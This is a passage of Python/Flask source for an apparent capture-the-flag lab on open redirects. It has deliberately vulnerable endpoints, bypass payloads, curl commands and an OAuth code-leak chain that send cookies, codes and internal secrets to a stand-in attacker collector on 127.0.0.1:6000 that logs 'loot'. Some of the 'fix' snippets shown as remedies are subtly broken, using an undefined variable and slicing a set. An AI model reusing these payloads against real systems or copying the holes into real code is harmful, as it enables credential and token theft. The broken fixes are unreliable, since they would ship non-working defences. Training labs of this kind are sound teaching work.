            "@app.route(\"/l8/return\")\n"
            "def l8_return():\n"
            "    \"\"\"L8b: 'go back where you came from' via Referer.\"\"\"\n"
            "    prev = request.headers.get(\"Referer\", \"\")\n"
            "    if prev:\n"
            "        return redirect(prev)   # BUG: no origin check on the header\n"
            "    return redirect(\"/l8\")"
        ),
        fix_code=(
            "# FIX: decide the redirect host from configuration, not from headers.\n"
            "TRUSTED_HOST = \"gateway.example\"\n"
            "host = TRUSTED_HOST                      # never read X-Forwarded-Host\n"
            "# (only a well-locked reverse proxy may set forwarding headers, and\n"
            "#  the front-end must overwrite — not append — attacker-supplied ones)\n"
            "if any(i in (h or \"\") for h in [\"X-Forwarded-Host\", \"Referer\"]):\n"
            "    # For 'go back', parse the Referer and require same-origin:\n"
            "    ref = urllib.parse.urlsplit(request.headers.get(\"Referer\", \"\"))\n"
            "    if ref.hostname != TRUSTED_HOST:\n"
            "        return redirect(\"/l8\")         # safe default\n"
            "return redirect(request.base_url)      # or a configured fallback"
        ),
        payload=("curl -H \"X-Forwarded-Host: 127.0.0.1:6000\" \"http://127.0.0.1:5000/l8/gateway?level=8\""),
        payload_note="Response Location becomes http://127.0.0.1:6000/l8/gateway?level=8 — with -i you can watch it. Referer variant: curl -H \"Referer: //127.0.0.1:6000/collect?level=8\" http://127.0.0.1:5000/l8/return",
        root_cause="Redirect authority assembled from attacker-controlled request headers without any server-side anchor. Headers are input; treat them like untrusted parameters.",
        success="Attacker server receives a request tagged level=8 (fired by the poisoned Location).",
    ),
    Level(
        num=9,
        title="OAuth redirect_uri abuse",
        category="oauth",
        scenario=(
            "A mock OAuth 2.0 provider issues authorization codes for client <code>webdemo</code>. "
            "The <code>redirect_uri</code> check is a weak <code>startswith(\"http://demo.app\")</code>. "
            "Craft an authorize URL whose redirect_uri smuggles the collector past the prefix, get a "
            "code, and watch it leak. A victim-bot button simulates an authenticated user."
        ),
        endpoints=[
            "GET /oauth/authorize?client_id=webdemo&amp;response_type=code&amp;scope=profile&amp;state=&lt;s&gt;&amp;redirect_uri=&lt;uri&gt;",
            "POST /oauth/login   · POST /oauth/token   (mock)",
            "POST /l9/bot url=&lt;authorize-url&gt;   (simulated logged-in victim)",
        ],
        hints=[
            "Log in once via the authorize page (any credentials) — the mock provider just needs a session. The code is appended to YOUR redirect_uri as ?code=…",
            "The prefix check is string-based: http://demo.app@127.0.0.1:5000/collect?level=9 starts with the right prefix but navigates to the relay (userinfo, again). The victim bot skips the browser and hits :6000 directly.",
            "Full authorize URL: /oauth/authorize?client_id=webdemo&response_type=code&scope=profile&state=x&redirect_uri=http%3A%2F%2Fdemo.app%40127.0.0.1%3A5000%2Fcollect%3Flevel%3D9 — or feed it to the victim bot below.",
        ],
        vuln_code=(
            "REGISTERED_PREFIX = \"http://demo.app\"\n"
            "\n"
            "@app.route(\"/oauth/authorize\")\n"
            "def oauth_authorize():\n"
            "    rid = request.args.get(\"redirect_uri\", \"\")\n"
            "    # BUG: weak prefix validation of redirect_uri.\n"
            "    # http://demo.app@127.0.0.1:6000/collect → passes, leaks the code.\n"
            "    if not rid.startswith(REGISTERED_PREFIX):\n"
            "        return \"invalid redirect_uri\", 400\n"
            "    if \"user\" not in session:\n"
            "        return login_form(next=request.full_path)   # mock login first\n"
            "    code = secrets.token_hex(8)\n"
            "    STATE[\"oauth_codes\"][code] = session[\"user\"]\n"
            "    sep = \"&\" if \"?\" in rid else \"?\"\n"
            "    return redirect(f\"{rid}{sep}code={code}&state={request.args.get('state','')}\")\n"
            "\n"
            "# The code lands on the attacker's server → session takeover."
        ),
        fix_code=(
            "# FIX: exact-match against extensions-registered URIs, bind state, PKCE.\n"
            "REG_URIS = {\"http://demo.app/oauth/callback\"}\n"
            "\n"
            "@app.route(\"/oauth/authorize\")\n"
            "def oauth_authorize_fixed():\n"
            "    rid = request.args.get(\"redirect_uri\", \"\")\n"
            "    if rid not in REG_URIS:                # exact string membership\n"
            "        return abort(400, \"redirect_uri not registered\")\n"
            "    state = request.args.get(\"state\", \"\")\n"
            "    if not state or state != session.get(\"oauth_state\"):\n"
            "        return abort(400, \"state mismatch\")   # CSRF for the login flow\n"
            "    # PKCE recommended: verify code_challenge at /oauth/token\n"
            "    code = secrets.token_urlsafe(24)      # short TTL, single use\n"
            "    return redirect(f\"{rid}?code={code}&state={state}\")"
        ),
        payload=(
            f"{LAB_BASE}/oauth/authorize?client_id=webdemo&response_type=code&scope=profile"
            "&state=n0p3&redirect_uri=http%3A%2F%2Fdemo.app%40127.0.0.1%3A5000%2Fcollect%3Flevel%3D9"
        ),
        payload_note="Open the link, submit the mock login (any user/pass), and the 302 leaks the fresh code to the relay → attacker log. With curl/Burp swap the host for 127.0.0.1:6000. The victim bot on the level page does it server-side.",
        root_cause="redirect_uri validated with a prefix instead of exact registration matching; the appended authorization code then travels to any spoofable location. Fix with exact URIs + state + PKCE + short-lived one-time codes.",
        success="Attacker server receives a request tagged level=9 containing a freshly issued code=… (see /logs).",
    ),
    Level(
        num=10,
        title="Chained fetcher (mini-SSRF)",
        category="ssrf",
        scenario=(
            "A trusted report fetcher will only ever retrieve "
            "<code>http://internal.lab/…</code> URLs — a solid allowlist on the FIRST hop. "
            "The internal network, however, contains an URL-forwarding utility at "
            "<code>/l10/pivot?p=…</code> that happily redirects anywhere, and the fetcher "
            "follows redirects without re-validating a single hop. Bonus: the content it "
            "fetches stays blind — exfiltrate it via a redirect."
        ),
        endpoints=[
            "GET /l10/fetch?url=&lt;url&gt;       (allowlisted internal fetcher)",
            "GET /l10/pivot?p=&lt;url&gt;&amp;include=secret   (internal redirect utility)",
            "GET /internal/secret          (fake internal service)",
        ],
        hints=[
            "First hop must have hostname internal.lab. Browsing /internal/secret directly is refused — only the fetcher's requests carry the internal zone marker.",
            "The internal utility /l10/pivot?p=URL is itself an open redirect: first hop passes the allowlist; every following redirect hops the fetcher wherever you point.",
            "Payload: /l10/fetch?url=http%3A%2F%2Finternal.lab%2Fl10%2Fpivot%3Fp%3Dhttp%253A%252F%252F127.0.0.1%253A6000%252Fcollect%253Flevel%253D10%26include%3Dsecret — with include=secret the pivot appends the internal secret to the redirect.",
        ],
        vuln_code=(
            "@app.route(\"/l10/fetch\")\n"
            "def l10_fetch():\n"
            "    \"\"\"L10: allowlisted fetcher that blindly follows redirects.\"\"\"\n"
            "    url = request.args.get(\"url\", \"\")\n"
            "    # Solid check… of the FIRST hop only:\n"
            "    if urllib.parse.urlparse(url).hostname != INTERNAL_HOST:\n"
            "        return \"blocked: only internal.lab may be fetched\", 400\n"
            "    # BUG: subsequent redirect hops are followed without re-validation.\n"
            "    # The fake-internal pivot then bounces the fetch to the attacker.\n"
            "    hops = follow_redirects_fetch(url)     # ← no per-hop host checks\n"
            "    return render_blind_report(hops)       # content stays hidden (blind)"
        ),
        fix_code=(
            "# FIX: re-validate every hop and treat redirects as untrusted input.\n"
            "ALLOWED = {\"http://internal.lab/\"}\n"
            "url = urllib.parse.urlsplit(input_url)\n"
            "url = url._replace(path=url.path or \"/\", fragment=\"\")\n"
            "if url.username or url.password:\n"
            "    return abort(400, \"userinfo in internal fetch\")\n"
            "target = urllib.parse.urlunsplit(url)\n"
            "if not target.startswith(tuple(ALLOWED[:1])):\n"
            "    return abort(400, \"first hop not allowlisted\")\n"
            "resp = library.opener.open(target)      # follow_redirects=False!\n"
            "while resp.is_redirect():\n"
            "    nxt = urllib.parse.urljoin(target, resp.headers[\"Location\"])\n"
            "    if urllib.parse.urlsplit(nxt).hostname != \"internal.lab\":\n"
            "        return abort(400, \"redirect hop left the internal zone\")\n"
            "    target = nxt\n"
            "    resp = library.opener.open(target)\n"
            "# egress allowlist, short timeouts, no credentials in redirects."
        ),
        payload=(
            f"{LAB_BASE}/l10/fetch?url=http%3A%2F%2Finternal.lab%2Fl10%2Fpivot%3Fp%3D"
            "http%253A%252F%252F127.0.0.1%253A6000%252Fcollect%253Flevel%253D10%26include%3Dsecret"
        ),
        payload_note="Chain: fetcher → internal.lab/l10/pivot (passes allowlist) → 302 to attacker with the pivot's internal secret appended → collector logs level=10. The blind report only shows status/length — the leak is the data.",
        root_cause="Validate-everything-then-follow-blindly. Each redirect hop is new user-influenced input; fetchers must re-apply the allowlist per hop, block userinfo, and pin DNS/IP of the internal zone.",
        success="Attacker server receives a request tagged level=10 (even better when it carries leaked_internal_secret=… from /internal/secret).",
    ),
]

# Build a fast num → Level index map.
BY_NUM: dict[int, Level] = {lv.num: lv for lv in LEVELS}

# ---------------------------------------------------------------------------
# Helper: loopback-only HTTP fetch with manual redirect following
# ---------------------------------------------------------------------------


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    """Never auto-follow redirects; lab_fetch drives hops itself."""

    def redirect_request(self, req, fp, code, msg, hdrs, newurl):  # type: ignore[no-untyped-def]
        return None


_LOOPBACK_OPENER = urllib.request.build_opener(
    _NoRedirect(), urllib.request.ProxyHandler({})
)  # no proxies, manual redirect chains


def _mapped_parts(url: str) -> tuple[str, int, str]:
    """Resolve a lab URL to loopback host:port + path/query.

    internal.lab → 127.0.0.1:5000. Any other hostname is rejected.
    Returns (host, port, pqp) or raises ValueError.
    """
    parts = urllib.parse.urlsplit(url)
    if parts.scheme != "http":
        raise ValueError(f"scheme '{parts.scheme}' is not HTTP — fetch blocked")
    host = (parts.hostname or "").lower()
    port = parts.port or 80
    if host == INTERNAL_HOST:
        host, port = LAB_HOST, LAB_PORT
    if host not in (LAB_HOST, ATTACKER_HOST, "localhost"):
        raise ValueError(f"host '{host}' is outside the lab — egress simulated/blocked")
    if port not in (LAB_PORT, ATTACKER_PORT):
        raise ValueError(f"port {port} is outside the lab — egress simulated/blocked")
    pqp = parts.path or "/"
    if parts.query:
        pqp += "?" + parts.query
    return host, port, pqp


def lab_fetch(url: str, headers: dict[str, str] | None = None, max_hops: int = 8) -> dict:
    """Fetch *url* with manual redirect following, loopback-only.

    Simulates a client: follows 30x Location chains hop by hop so redirect
    misconfigurations become observable. Never performs real outbound traffic.
    """
    chain: list[dict] = []
    current = url
    body_text = ""
    status, ctype, length = 0, "", 0
    for hop in range(1, max_hops + 1):
        try:
            host, port, pqp = _mapped_parts(current)
        except ValueError as exc:
            return {"err": str(exc), "chain": chain}
        req = urllib.request.Request(f"http://{host}:{port}{pqp}", headers=headers or {})
        try:
            resp = _LOOPBACK_OPENER.open(req, timeout=5)
        except urllib.error.HTTPError as http_err:  # 3xx/4xx/5xx still readable
            resp = http_err
        except Exception as exc:  # connection refused etc.
            return {"err": f"request failed: {exc}", "chain": chain}
        chain.append({"hop": hop, "url": current, "status": resp.status})
        status = int(resp.status)
        ctype = resp.headers.get("Content-Type", "")
        location = resp.headers.get("Location", "")
        if 300 <= status < 400 and location:
            current = urllib.parse.urljoin(current, location)
            continue
        # final response: read (blind-cap) the body
        body_text = resp.read(2000).decode("utf-8", "replace")
        length = len(body_text)
        break
    return {"status": status, "ctype": ctype, "length": length, "body": body_text, "chain": chain}

# ---------------------------------------------------------------------------
# Attacker collection server (127.0.0.1:6000)
# ---------------------------------------------------------------------------

ATTACKER = Flask(__name__)
ATTACKER.url_map.strict_slashes = False

_LOG_HEADERS = ("Host", "User-Agent", "Referer", "X-Forwarded-Host", "Cookie", "Accept-Language")


def _log_view_body(entries: list[dict], origin_link: str = ATTACKER_BASE) -> str:
    """Render the loot table shared by the collector and the lab's in-app mirror."""
    rows = []
    for e in entries[:80]:
        lvl = f"<span class='tag'>level {e['level']}</span>" if e["level"] else "<span class='muted'>–</span>"
        hdrs = "<br>".join(f"{k}: {escape(v)}" for k, v in e["headers"].items()) or "—"
        full = e["path"] + (f"?{e['query']}" if e["query"] else "")
        rows.append(
            f"<tr><td>{e['ts']}</td><td>{escape(e['method'])}</td>"
            f"<td class='mono'>{escape(full)}</td><td>{lvl}</td>"
            f"<td class='mono'>{hdrs}</td>"
            f"<td class='muted'>{escape(e['extra']) or '—'}</td></tr>"
        )
    table = (
        "<table class='log'><tr><th>time</th><th>verb</th><th>full URL w/o fragment</th>"
        "<th>level</th><th>interesting headers</th><th>notes</th></tr>"
        + "".join(rows) + "</table>"
    ) if rows else "<p class='muted'>Nothing captured yet. Solve a level first.</p>"
    return (
        "<h1>Attacker collection server <span class='traffic'>role: attacker</span></h1>"
        "<p class='muted'>Every request that reaches the collection server is logged here. "
        "Browsers never transmit URL fragments (#…), which is exactly why the DOM level's "
        "hash sink is invisible server-side until the second hop.</p>"
        f"<p><a class='btn' href='javascript:location.reload()'>refresh</a> · "
        f"{len(entries)} recorded events · canonical view: <span class='mono'>{origin_link}/logs</span></p>"
        + table
    )


@ATTACKER.after_request
def _atk_headers(resp: Response) -> Response:
    resp.headers["X-Attacker-Role"] = "collection-server"
    return resp


def _handle_loot() -> Response:
    """Record any request that lands here; detect its level tag; mark solved."""
    query = request.query_string.decode("utf-8", "replace")
    entry = {
        "ts": datetime.now().strftime("%H:%M:%S.%f")[:-3],
        "method": request.method,
        "path": request.path,
        "query": query,
        "headers": {k: request.headers.get(k, "") for k in _LOG_HEADERS if request.headers.get(k)},
        "level": None,
        "extra": "",
    }
    tagged = shortfall(request.path + "?" + query)
    if tagged:
        entry["level"] = tagged
        ev_bits = [f"tag level={tagged}"]
        if "stolen=" in query:
            entry["extra"] = "XSS payload exfiltrated document.cookie"
            ev_bits.append(entry["extra"])
        if "leaked_internal_secret=" in query:
            leaked = urllib.parse.parse_qs(query).get("leaked_internal_secret", [""])[0]
            if leaked and leaked == STATE["internal_secret"]:
                entry["extra"] = f"injected internal secret from /internal/secret ({leaked})"
                ev_bits.append("SSRF exfiltration of internal secret confirmed")
        solve_level(tagged, evidence=" -> ".join(ev_bits))
    add_attacker_log(entry)
    print(f"  [LOOT] {entry['method']} {entry['path']}?{entry['query']} "
          f"level={entry['level'] or '-'}", flush=True)
    body = (
        "<!doctype html><title>LOOT RECEIVED</title>"
        "<pre style='background:#111;color:#3ecf8e;padding:20px'>"
        "LOOT RECEIVED — stored at " + ATTACKER_BASE + "/logs\n"
        f"[{entry['ts']}] {entry['method']} {entry['path']}"
        + (entry["query"] and ("\nquery: " + entry["query"]) or "")
        + "\nfragment (never sent by browsers): —"
        "</pre><p><a style='color:#4fc3f7' href='/logs'>open the log</a></p>"
    )
    return Response(body, mimetype="text/html")


@ATTACKER.route("/logs")
def attacker_logs() -> Response:
    """Show every recorded incoming request to the 'attacker'."""
    body = _log_view_body(list(reversed(list(STATE["logs"]))))
    return render_page("attacker logs", body)


@ATTACKER.route("/")
@ATTACKER.route("/favicon.ico")
def attacker_root() -> Response:
    """Catch traffic that had no explicit path."""
    if request.path == "/favicon.ico":
        return Response(status=204)
    return _handle_loot()


@ATTACKER.route("/<path:rest>", methods=["GET", "POST", "PUT", "HEAD", "PATCH", "DELETE"])
def attacker_any(rest: str) -> Response:
    """Catch-all loot collector: any path, any verb, logged and tagged."""
    if rest == "favicon.ico":
        return Response(status=204)
    if rest == "logs":  # never shadow the log viewer
        return attacker_logs()  # type: ignore[name-defined]
    return _handle_loot()

# ---------------------------------------------------------------------------
# Lab application (127.0.0.1:5000) — public pages
# ---------------------------------------------------------------------------

LAB = Flask(__name__)
LAB.url_map.strict_slashes = False
LAB.secret_key = secrets.token_hex(32)  # sessions only exist for the OAuth level


@LAB.after_request
def _lab_headers(resp: Response) -> Response:
    resp.headers["Server"] = "RedirectLab/1.0"
    return resp


@LAB.route("/favicon.ico")
def favicon() -> Response:
    return Response(status=204)


def _status_badge(n: int) -> str:
    if is_solved(n):
        return "<span class='badge ok'>solved ✓</span>"
    return "<span class='badge todo'>unsolved</span>"


@LAB.route("/")
def scoreboard() -> Response:
    """Overview page: every level, its status, and the running total."""
    with STATE_LOCK:
        solved_count = len(STATE["solved"])
    total = solved_count * SCORE_PER_LEVEL
    tiles = []
    for lv in LEVELS:
        flag = ""
        if is_solved(lv.num):
            f = STATE["flags"][lv.num]
            flag = f"<div class='flag mono'>{escape(f)}</div>"
        tiles.append(
            f"<div class='tile'>"
            f"<span class='lvlno'>LEVEL {lv.num} · {lv.category.upper()}</span>{_status_badge(lv.num)}"
            f"<h3><a href='/l{lv.num}'>{escape(lv.title)}</a></h3>"
            f"<p class='muted' style='font-size:13px;margin:0'>{escape(lv.category)} · "
            f"{SCORE_PER_LEVEL} pts</p>{flag}"
            f"</div>"
        )
    pct = int(100 * solved_count / LEVEL_COUNT)
    body = (
        "<h1>Open Redirect training lab</h1>"
        "<p class='muted'>Ten levels, escalating difficulty. Each level is solved when the "
        "<b>attacker collection server</b> (port 6000, same page set) receives a request tagged "
        "with that level, e.g. <code class='k'>?level=3</code> anywhere in the exfiltrated URL. "
        "Browser note: Chrome/Edge block direct connections to the collector's :6000 (restricted-port "
        "list) — browser hops go through <code class='k'>/collect</code> on :5000, which relays your "
        "loot to the attacker server verbatim; curl and Burp can hit :6000 directly. "
        "Level page code panels are toggleable — enable <b>black-box mode</b> above to hide them.</p>"
        "<div class='card'><h2>Score: " f"<span class='mono'>{total}</span> / {LEVEL_COUNT*SCORE_PER_LEVEL}</h2>"
        "<div class='scorebar'><div style='width:" f"{pct}%'></div></div>"
        f"<p class='muted mono'>{solved_count}/{LEVEL_COUNT} levels solved · flags regenerate at restart</p></div>"
        "<div class='grid'>" + "".join(tiles) + "</div>"
        "<div class='info'>Tip: run <code class='k'>curl -i</code> against redirect endpoints to see raw "
        "Location headers, or use Burp Repeater / DevTools Network tab. The solutions page exists — try hints first.</div>"
    )
    return render_page("scoreboard", body)


@LAB.route("/reset", methods=["GET", "POST"])
def reset() -> Response:
    """Clear all progress and captured loot (flags stay for this run)."""
    if request.method == "POST":
        with STATE_LOCK:
            STATE["solved"].clear()
            STATE["logs"].clear()
            STATE["oauth_codes"].clear()
        return redirect("/")
    body = (
        "<h1>Reset progress?</h1>"
        "<div class='card'><p>This clears: solved levels, the scoreboard, and all attacker logs "
        "(in memory only — a server restart does the same).</p>"
        "<form method='post' action='/reset' class='inline'>"
        "<button class='btn' type='submit'>Yes — reset lab state</button>"
        "<a class='btn' href='/'>Cancel</a></form></div>"
    )
    return render_page("reset", body)


@LAB.route("/attacker-mirror")
def attacker_mirror() -> Response:
    """In-app mirror of the collector's log (Chrome refuses to open :6000).

    Same data, live from shared process state; the canonical view stays at
    http://127.0.0.1:6000/logs and is reachable by curl/Burp/DevTools.
    """
    with STATE_LOCK:
        entries = list(reversed(STATE["logs"]))
    body = _log_view_body(entries)
    return render_page("attacker log (mirror)", body)


@LAB.route("/solutions")
def solutions() -> Response:
    """Full walkthrough (collapsed, with a warning). Black-box friendly."""
    warn = (
        "<div class='warnbox'><b>Spoiler alert.</b> These are ready-made payloads with the root "
        "cause and fix for every level. Prefer the 3 progressive hints on each level page first; "
        "use this for revision or after you're truly stuck.</div>"
    )
    blocks = []
    for lv in LEVELS:
        clickable = lv.payload.startswith("http")
        link = (f"<a class='btn' href='{escape(lv.payload)}' style='font-family:var(--mono);word-break:break-all'>"
                "Open payload</a>") if clickable else ""
        blocks.append(
            f"<details><summary>L{lv.num} · {escape(lv.title)}</summary><div class='pad'>"
            f"<p><b>Victim-facing URL / command:</b> <code class='k' style='word-break:break-all'>"
            f"{escape(lv.payload)}</code></p>"
            f"<p>{link}</p>"
            f"<p><b>Why it works:</b> {lv.payload_note}</p>"
            f"<p class='mono'><span class='tag'>root cause</span> {lv.root_cause}</p>"
            f"<p><b>How to fix:</b></p>{code_block(lv.fix_code)}"
            f"</div></details>"
        )
    body = "<h1>Solutions</h1>" + warn + "".join(blocks)
    return render_page("solutions", body)


# ---------------------------------------------------------------------------
# Level page rendering
# ---------------------------------------------------------------------------


def _hint_blocks(lv: Level) -> str:
    out = []
    for i, hint in enumerate(lv.hints, start=1):
        out.append(
            f"<details class='hint'><summary>Hint {i} of {len(lv.hints)} — "
            f"{escape(hint.split('.')[0])}…</summary><div class='pad'>{hint}</div></details>"
        )
    return "".join(out)


def _level_widget(n: int) -> str:
    """Per-level interactive extras (bot / fetch forms)."""
    if n == 9:
        return (
            "<div class='card'><h3>Victim bot (simulated authenticated user)</h3>"
            "<p class='muted'>The bot fetches a URL you give it, with an attacker-influenced "
            "browser session (logged in), following every redirect like a real client would.</p>"
            "<form method='post' action='/l9/bot' class='inline'>"
            "<input type='text' name='url' placeholder='" + LAB_BASE + "/oauth/authorize?…' >"
            "<button class='btn' type='submit'>Send victim</button>"
            "</form></div>"
        )
    if n == 10:
        return (
            "<div class='card'><h3>Report fetcher front-end</h3>"
            "<form method='get' action='/l10/fetch' class='inline'>"
            "<input type='text' name='url' value='http://internal.lab/' placeholder='internal URL'>"
            "<button class='btn' type='submit'>&#x21b3; fetch (blind)</button>"
            "</form></div>"
        )
    return ""


@LAB.route("/l<int:num>")
def level_page(num: int) -> Response:
    """Render one level: scenario, hints, code panel, success panel, widget."""
    lv = BY_NUM.get(num)
    if lv is None:
        return render_page("not found", "<h1>No such level.</h1>", 404)
    solved = is_solved(num)
    flag_html = ""
    fix_html = ""
    if solved:
        flag_html = (
            "<div class='card'><h2>Solved ✓</h2>"
            f"<p>Evidence: <span class='mono'>{escape(STATE['solved'][num]['evidence'])}</span> "
            f"<span class='muted'>@ {STATE['solved'][num]['ts']}</span></p>"
            f"<p>Your flag:</p><div class='flag mono'>{escape(STATE['flags'][num])}</div></div>"
        )
        fix_html = ("<div class='card'><h2>How to fix</h2>" + code_block(lv.fix_code) + "</div>")
    eps = "".join(f"<li><code class='k'>{e}</code></li>" for e in lv.endpoints)
    widget = _level_widget(num)
    body = (
        f"<h1>L{lv.num} · {escape(lv.title)} {_status_badge(num)}"
        f"<span class='badge diff'>{escape(lv.category)}</span></h1>"
        f"<div class='card'><h2>Scenario</h2><p>{lv.scenario}</p>"
        f"<p class='muted'><b>Success condition:</b> {escape(lv.success)}</p>"
        f"<p><b>Exposed endpoints:</b><ul class='tight'>{eps}</ul></p>"
        f"<div class='info'>The attacker collector runs at <b>{ATTACKER_BASE}</b> (canonical "
        f"<span class='mono'>{ATTACKER_BASE}/logs</span>; browsers can also use the in-app "
        f"<a href='/attacker-mirror'>/attacker-mirror</a> — Chrome refuses to open :6000). "
        f"Tag your payload with <code class='k'>level={lv.num}</code>; note that browser hops "
        f"must route via <code class='k'>{LAB_BASE}/collect?level={lv.num}</code>.</div></div>"
        + widget
        + "<div class='card'><h2>Hints</h2>" + _hint_blocks(lv) + "</div>"
        + f"<div class='card devpanel'><h2>Vulnerable code (L{lv.num})</h2>"
          "<p class='muted'>Visible study aid — enable <b>black-box mode</b> to hide.</p>"
        + code_block(lv.vuln_code) + "</div>"
        + flag_html
        + fix_html
        + (f"<p><a href='/l{num + 1}'>next level →</a></p>" if num < LEVEL_COUNT else "")
    )
    return render_page(f"L{num} {lv.title}", body)

# ---------------------------------------------------------------------------
# Vulnerable endpoints — Levels 1..5
# ---------------------------------------------------------------------------


@LAB.route("/l1/redirect")
def l1_redirect() -> Response:
    """L1: forward the user wherever they asked — no validation at all."""
    target = request.args.get("url", "/")
    return redirect(target)


@LAB.route("/l2/redirect")
def l2_redirect() -> Response:
    """L2: block-list-everything-but trusted prefix check (bypassable)."""
    trusted_origin = f"http://{LAB_HOST}:{LAB_PORT}"
    target = request.args.get("url", "/")
    if not target.startswith(trusted_origin):  # string check, not URL check
        return make_response("denied: off-site redirects not allowed", 400)
    return redirect(target)


@LAB.route("/l3/redirect")
def l3_redirect() -> Response:
    """L3: trusted domain validated as substring of the target."""
    trusted_domain = "trusted.lab"
    target = request.args.get("url", "/")
    if trusted_domain not in target:
        return make_response("denied: untrusted domain", 400)
    return redirect(target)


@LAB.route("/l4/redirect")
def l4_redirect() -> Response:
    """L4: blacklist of literal scheme strings (protocol-relative leaks)."""
    forbidden = ("http://", "https://")
    target = request.args.get("url", "/")
    for bad in forbidden:
        if bad in target:
            return make_response("denied: scheme not on the block-list", 400)
    return redirect(target)


@LAB.route("/l5/redirect")
def l5_redirect() -> Response:
    """L5: WAF validates once-decoded input; legacy normalizer decodes twice more."""
    blocked_hosts = {"127.0.0.1", "localhost", ATTACKER_HOST}
    raw = request.args.get("next_url", "")
    parts = urllib.parse.urlparse(raw)  # only sees ONE decode view
    if parts.hostname in blocked_hosts:
        return make_response("denied: WAF blocked external redirect", 400)
    target = urllib.parse.unquote(urllib.parse.unquote(raw))  # decode mismatch
    return redirect(target)

# ---------------------------------------------------------------------------
# Vulnerable endpoints — Levels 6..8
# ---------------------------------------------------------------------------


@LAB.route("/l6/redirect")
def l6_redirect() -> Response:
    """L6: allowlist powered by naive split('/') host parsing."""
    allowed_hosts = ("trusted.lab",)
    target = request.args.get("url", "/")
    try:
        host = target.split("/")[2]  # BUG: ignores userinfo, only matches prefix
        if not host.startswith(allowed_hosts):
            return make_response("denied: host not on the allowlist", 400)
        return redirect(target)
    except IndexError:
        return make_response("could not parse host", 400)


_L7_PAGE_BODY = (
    "<h1>L7 · Link preview portal</h1>"
    "<div class='card'>"
    "<p>This page decides your destination <b>in the browser</b>. Two sinks are wired to it:</p>"
    "<ul class='tight'>"
    "<li>query sink: <code class='k'>?goto=…</code> → <span class='mono'>location.href</span></li>"
    "<li>fragment sink: <code class='k'>#…</code> → <span class='mono'>location</span> (never sent to the server)</li>"
    "</ul>"
    "<p class='muted'>A <code class='k'>javascript:</code> scheme is accepted by both sinks "
    "→ DOM-based XSS. This page also plants a readable cookie <code class='k'>l7_marker</code> "
    "you can exfiltrate to prove the payload executed.</p>"
    "</div>"
    "<script>"
    "try{var q=new URLSearchParams(location.search).get('goto');"
    "if(q){window.location.href=q;}}"
    "catch(e){}"
    "try{var frag=location.hash.slice(1);"
    "if(frag){try{frag=decodeURIComponent(frag);}catch(e){} window.location=frag;}}"
    "catch(e){}"
    "</script>"
)


@LAB.route("/l7")
def l7_page() -> Response:
    """L7: DOM-based redirect/XSS page — sinks live in the browser."""
    resp = make_response(render_page(f"L7 {escape('DOM sink parade')}", _L7_PAGE_BODY))
    # deliberately NOT HttpOnly: the XSS payload should be able to read it
    resp.set_cookie("l7_marker", STATE["dom_marker"], samesite="Lax")
    return resp


@LAB.route("/l8/gateway")
def l8_gateway() -> Response:
    """L8a: redirect host assembled from the X-Forwarded-Host header."""
    host = request.headers.get("X-Forwarded-Host", "").strip() or request.host
    target = f"http://{host}{request.full_path.rstrip('?')}"
    return redirect(target)


@LAB.route("/l8/return")
def l8_return() -> Response:
    """L8b: 'return where you came from' — trusted straight from the Referer."""
    prev = request.headers.get("Referer", "")
    if prev:
        return redirect(prev)
    return redirect("/l8")

# ---------------------------------------------------------------------------
# Browser-safe relay
# ---------------------------------------------------------------------------
# Chrome/Edge refuse TCP connections to some ports (6000 is on the restricted
# list — "X11"), so a browser hopping to 127.0.0.1:6000 fails with
# ERR_UNSAFE_PORT. The attacker server stays on 6000 as the true collector
# (reachable by curl, Burp, urllib, bots). Browsers bounce their loot against
# this relay first; it forwards the request verbatim to the attacker server.


@LAB.route("/collect")
def browser_relay() -> Response:
    """Relay browser-side loot to the attacker collector on :6000.

    Accepts the same tags (e.g. ?level=7&stolen=…) as direct connections; the
    forwarding pass is what actually records the entry at the attacker server.
    """
    query = request.query_string.decode("utf-8", "replace")
    target = f"{ATTACKER_BASE}/collect"
    if query:
        target += f"?{query}"
    fwd_headers = {
        "User-Agent": f"relay:{request.headers.get('User-Agent', 'browser')[:120]}",
        "Referer": request.headers.get("Referer", ""),
    }
    result = lab_fetch(target, headers=fwd_headers)
    chain_rows = "".join(
        f"<li><span class='mono'>{escape(str(h['status']))}</span> → "
        f"<span class='mono'>{escape(h['url'])}</span></li>"
        for h in result.get("chain", [])
    )
    if result.get("err"):
        chain_rows += f"<li class='mono' style='color:#ef6c6c'>{escape(result['err'])}</li>"
    tag = shortfall(query)
    solved_note = (
        f"<p><span class='tag'>Tagged level {tag}</span> — collect your flag on the level page.</p>"
        if tag else "<p>No level tag attached (use ?level=N to score).</p>"
    )
    body = (
        "<h1>Loot relayed <span class='muted'>→ attacker collector</span></h1>"
        "<div class='card'>"
        f"<p><b>Relayed query:</b> <span class='mono' style='word-break:break-all'>{escape(query) or '—'}</span></p>"
        "<p class='muted'>Browsers cannot connect to the collector's port 6000 directly "
        "(restricted-port list), so this endpoint forwards your request to "
        f"<span class='mono'>{ATTACKER_BASE}</span> exactly as sent — the entry will appear "
        "in the attacker's log.</p>"
        f"<p><b>Forward chain:</b></p><ol class='tight'>{chain_rows or '<li>—</li>'}</ol>"
        + solved_note +
        "<p><a href='/attacker-mirror' target='_blank'>open the in-app log mirror</a></p>"
        "</div>"
    )
    return render_page("loot relay", body)


# ---------------------------------------------------------------------------
# Vulnerable mock OAuth flow — Level 9
# ---------------------------------------------------------------------------


def _oauth_login_form(next_path: str) -> Response:
    """Fake provider login form (any credentials work)."""
    body = (
        "<h1>Sign in — Lab OAuth Provider</h1>"
        "<div class='card'><form method='post' action='/oauth/login' style='max-width:360px'>"
        f"<input type='hidden' name='next' value='{escape(next_path)}'>"
        "<p><label>username<br><input type='text' name='username' value='alice' style='width:100%'></label></p>"
        "<p><label>password<br><input type='password' name='password' style='width:100%'></label></p>"
        "<p><button class='btn' type='submit'>Continue (mock)</button> "
        "<span class='muted'>any credentials are accepted in this mock</span></p>"
        "</form></div>"
    )
    return render_page("OAuth login", body)


@LAB.route("/oauth/login", methods=["POST"])
def oauth_login() -> Response:
    """Set a session (mock) and bounce back to the authorize page."""
    user = request.form.get("username", "victim")
    session.clear()
    session["user"] = user
    nxt = request.form.get("next", "/")
    if not nxt.startswith("/oauth/"):
        nxt = "/oauth/authorize"  # a fixed redirect would matter in real code
    return redirect(nxt)


@LAB.route("/oauth/authorize")
def oauth_authorize() -> Response:
    """Mock authorize endpoint with WEAK redirect_uri validation (L9)."""
